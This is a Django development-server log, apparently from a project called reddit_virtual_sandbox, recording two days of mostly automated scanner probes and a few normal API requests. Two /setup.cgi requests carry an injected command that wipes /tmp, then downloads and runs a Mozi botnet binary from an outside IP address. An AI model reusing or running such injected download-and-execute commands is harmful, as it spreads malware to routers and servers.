+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:05:00:16 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:05:00:16 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 05:00:16] "GET /manager/html HTTP/1.1" 400 66140
+[23/Jan/2021 05:29:55] code 400, message Bad request syntax ("\x16\x03\x03\x00\x99\x01\x00\x00\x95\x03\x03`\x0b´\x88c\x0f\x15!çã'\xa04\x19x\x95ö\x851x:i'=c©Xd¦\x8cæ\x90\x00\x004À(À'À\x14À\x13\x00\x9f\x00\x9e\x00\x9d\x00\x9cÀ,À+À$À#À")
+[23/Jan/2021 05:29:55] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /config/getuser
+2021-01-23:05:54:36 WARNING [log.py:log_response:L230] Not Found: /config/getuser
+[23/Jan/2021 05:54:36] "GET /config/getuser?index=0 HTTP/1.1" 404 8754
+[23/Jan/2021 06:21:31] "GET / HTTP/1.0" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:06:22:01 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:06:22:01 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 06:22:01] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:06:57:45 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:06:57:45 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 06:57:45] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:07:07:38 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:07:07:38 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 07:07:38] "GET /manager/html HTTP/1.1" 400 66139
+[23/Jan/2021 08:54:00] "GET / HTTP/1.1" 200 71
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:08:56:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:08:56:39 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 08:56:39] "GET /manager/html HTTP/1.1" 400 66140
+[23/Jan/2021 09:22:09] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:09:58:15 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:09:58:15 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 09:58:15] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:10:51:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:10:51:39 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 10:51:39] "GET /manager/html HTTP/1.1" 400 66140
+Not Found: /hudson
+2021-01-23:11:09:44 WARNING [log.py:log_response:L230] Not Found: /hudson
+[23/Jan/2021 11:09:44] "GET /hudson HTTP/1.1" 404 8722
+[23/Jan/2021 11:36:55] code 400, message Bad request syntax ('\x05\x01\x00')
+[23/Jan/2021 11:36:55] " " 400 -
+[23/Jan/2021 11:37:01] code 400, message Bad request syntax ('\x05\x01\x00')
+[23/Jan/2021 11:37:01] " " 400 -
+[23/Jan/2021 11:37:08] code 400, message Bad request syntax ('\x05\x01\x00')
+[23/Jan/2021 11:37:08] " " 400 -
+Invalid HTTP_HOST header: 'ip.ws.126.net:443'. You may need to add 'ip.ws.126.net' to ALLOWED_HOSTS.
+2021-01-23:11:37:31 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip.ws.126.net:443'. You may need to add 'ip.ws.126.net' to ALLOWED_HOSTS.
+Bad Request: /ip.ws.126.net:443
+2021-01-23:11:37:31 WARNING [log.py:log_response:L230] Bad Request: /ip.ws.126.net:443
+[23/Jan/2021 11:37:31] "CONNECT ip.ws.126.net:443 HTTP/1.1" 400 66416
+[23/Jan/2021 11:38:49] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[23/Jan/2021 11:38:49] " P¼Òã " 400 -
+[23/Jan/2021 11:38:56] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[23/Jan/2021 11:38:56] " P¼Òã " 400 -
+[23/Jan/2021 11:39:02] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[23/Jan/2021 11:39:02] " P¼Òã " 400 -
+Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+2021-01-23:11:40:10 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '5.188.210.227'. You may need to add '5.188.210.227' to ALLOWED_HOSTS.
+Bad Request: /http:/5.188.210.227/echo.php
+2021-01-23:11:40:10 WARNING [log.py:log_response:L230] Bad Request: /http:/5.188.210.227/echo.php
+[23/Jan/2021 11:40:10] "GET http://5.188.210.227/echo.php HTTP/1.1" 400 67895
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:12:29:47 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:12:29:47 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 12:29:47] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:12:47:41 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:12:47:41 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 12:47:41] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+2021-01-23:13:38:59 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: '127.0.0.1:8080'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+2021-01-23:13:38:59 WARNING [log.py:log_response:L230] Bad Request: /GponForm/diag_Form
+[23/Jan/2021 13:38:59] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 67096
+[23/Jan/2021 14:25:25] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-23:14:33:31 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /boaform/admin/formLogin
+2021-01-23:14:33:31 WARNING [log.py:log_response:L230] Bad Request: /boaform/admin/formLogin
+[23/Jan/2021 14:33:31] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 400 67228
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:14:50:42 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:14:50:42 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 14:50:42] "GET /manager/html HTTP/1.1" 400 66140
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+[23/Jan/2021 14:50:42] "GET /manager/html HTTP/1.1" 500 59
+----------------------------------------
+Exception happened during processing of request from ('205.185.121.138', 51224)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 279, in write
+    self._write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 453, in _write
+    result = self.stdout.write(data)
+  File "/usr/lib/python3.6/socketserver.py", line 803, in write
+    self._sock.sendall(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 141, in run
+    self.handle_error()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 119, in handle_error
+    super().handle_error()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 368, in handle_error
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 180, in finish_response
+    self.write(data)
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 274, in write
+    self.send_headers()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 331, in send_headers
+    if not self.origin_server or self.client_is_modern():
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 344, in client_is_modern
+    return self.environ['SERVER_PROTOCOL'].upper() != 'HTTP/0.9'
+TypeError: 'NoneType' object is not subscriptable
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 197, in handle_one_request
+    handler.run(self.server.get_app())
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 144, in run
+    self.close()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 114, in close
+    super().close()
+  File "/usr/lib/python3.6/wsgiref/simple_server.py", line 35, in close
+    self.status.split(' ',1)[0], self.bytes_sent
+AttributeError: 'NoneType' object has no attribute 'split'
+----------------------------------------
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:15:35:36 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:15:35:36 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 15:35:36] "GET /manager/html HTTP/1.1" 400 66139
+[23/Jan/2021 15:40:19] "OPTIONS /rest-auth/user/ HTTP/1.1" 200 0
+[23/Jan/2021 15:40:19] "GET /rest-auth/user/ HTTP/1.1" 200 73
+[23/Jan/2021 15:40:19] "OPTIONS /reddit_logged HTTP/1.1" 200 0
+[23/Jan/2021 15:40:19] "GET /reddit_logged HTTP/1.1" 301 0
+[23/Jan/2021 15:40:19] "OPTIONS /reddit_logged/ HTTP/1.1" 200 0
+[23/Jan/2021 15:40:19] "GET /reddit_logged/ HTTP/1.1" 200 5
+[23/Jan/2021 15:40:19] "OPTIONS /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 0
+[23/Jan/2021 15:40:19] "OPTIONS /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 0
+[23/Jan/2021 15:40:19] "GET /rest-auth/user/ HTTP/1.1" 200 73
+[23/Jan/2021 15:40:19] "GET /reddit_logged/ HTTP/1.1" 200 5
+[23/Jan/2021 15:40:19] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 694
+[23/Jan/2021 15:40:19] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6593
+[23/Jan/2021 15:40:19] "GET /spam/?post_type=all&sort=created-new&filtered=all&page=1 HTTP/1.1" 200 694
+[23/Jan/2021 15:40:19] "GET /post/?post_type=all&sort=new&filtered=all&page=1&is_private=true HTTP/1.1" 200 6593
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:15:43:55 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:15:43:55 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 15:43:55] "GET /manager/html HTTP/1.1" 400 66140
+[23/Jan/2021 16:56:45] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:17:59:35 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:17:59:35 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 17:59:35] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:18:11:11 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:18:11:11 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 18:11:11] "GET /manager/html HTTP/1.1" 400 66138
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.40', 46824)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[23/Jan/2021 18:12:19] "GET / HTTP/1.1" 200 81
+----------------------------------------
+Exception happened during processing of request from ('167.248.133.40', 38964)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[23/Jan/2021 18:12:19] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:18:55:51 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /script
+2021-01-23:18:55:51 WARNING [log.py:log_response:L230] Bad Request: /script
+[23/Jan/2021 18:55:51] "GET /script HTTP/1.1" 400 66073
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:20:19:05 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:20:19:05 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 20:19:05] "GET /manager/html HTTP/1.1" 400 66138
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.53', 36352)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 172, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[23/Jan/2021 20:57:43] "GET / HTTP/1.1" 200 81
+----------------------------------------
+Exception happened during processing of request from ('74.120.14.53', 36846)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/home/ubuntu/reddit_virtual_sandbox/server/env/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[23/Jan/2021 20:57:43] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:21:13:39 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:21:13:39 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 21:13:39] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-23:21:20:27 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /setup.cgi
+2021-01-23:21:20:27 WARNING [log.py:log_response:L230] Bad Request: /setup.cgi
+[23/Jan/2021 21:20:27] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.50.90.25:45358/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 68766
+[23/Jan/2021 21:40:45] "GET / HTTP/1.1" 200 5441
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-23:22:14:05 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-23:22:14:05 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[23/Jan/2021 22:14:06] "GET /manager/html HTTP/1.1" 400 66138
+Not Found: /config/getuser
+2021-01-23:23:29:33 WARNING [log.py:log_response:L230] Not Found: /config/getuser
+[23/Jan/2021 23:29:33] "GET /config/getuser?index=0 HTTP/1.1" 404 8754
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:00:01:56 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:00:01:56 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 00:01:56] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:00:11:02 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:00:11:02 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 00:11:02] "GET /manager/html HTTP/1.1" 400 66138
+[24/Jan/2021 01:21:19] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:01:45:25 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:01:45:25 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 01:45:25] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:01:46:54 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:01:46:54 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 01:46:54] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:02:40:35 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:02:40:35 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 02:40:35] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:02:47:57 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:02:47:57 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 02:47:57] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:03:40:36 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:03:40:36 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 03:40:36] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:03:50:21 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:03:50:21 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 03:50:21] "GET /manager/html HTTP/1.1" 400 66140
+[24/Jan/2021 04:02:14] "GET / HTTP/1.1" 200 81
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-24:04:24:54 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /
+2021-01-24:04:24:54 WARNING [log.py:log_response:L230] Bad Request: /
+[24/Jan/2021 04:25:20] "GET / HTTP/1.0" 400 66834
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:05:18:56 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:05:18:56 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 05:18:56] "GET /manager/html HTTP/1.1" 400 66138
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:05:35:15 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:05:35:15 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 05:35:15] "GET /manager/html HTTP/1.1" 400 66139
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:05:43:42 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:05:43:42 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 05:43:43] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+2021-01-24:06:16:48 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: 'ip-172-31-4-85.ap-northeast-2.compute.internal:8080'. You may need to add 'ip-172-31-4-85.ap-northeast-2.compute.internal' to ALLOWED_HOSTS.
+Bad Request: /setup.cgi
+2021-01-24:06:16:48 WARNING [log.py:log_response:L230] Bad Request: /setup.cgi
+[24/Jan/2021 06:16:48] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://113.87.88.128:39155/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 400 68775
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:07:38:20 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:07:38:20 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 07:38:21] "GET /manager/html HTTP/1.1" 400 66140
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:07:54:56 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:07:54:56 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 07:54:56] "GET /manager/html HTTP/1.1" 400 66138
+[24/Jan/2021 08:16:16] code 400, message Bad request syntax ("\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03\x0c\x82\x02\x18w³d\xa0\x93-ñÒ\x1fh©,Ö\x8c´_Î\x04\x8c¸\x9bS\x1c\x9eÕtÍê \x0b@rÅ,ký=Íö\x8cðà£Ú@Rnæ\x8b\x99Ìo\x89\x9b¯µ\x1c*'\x9f\x9f\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À")
+[24/Jan/2021 08:16:16] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+2021-01-24:08:22:43 ERROR  [exception.py:response_for_exception:L90] Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+2021-01-24:08:22:43 WARNING [log.py:log_response:L230] Bad Request: /manager/html
+[24/Jan/2021 08:22:43] "GET /manager/html HTTP/1.1" 400 66139
+Not Found: /vXY6
+2021-01-24:08:41:55 WARNING [log.py:log_response:L230] Not Found: /vXY6
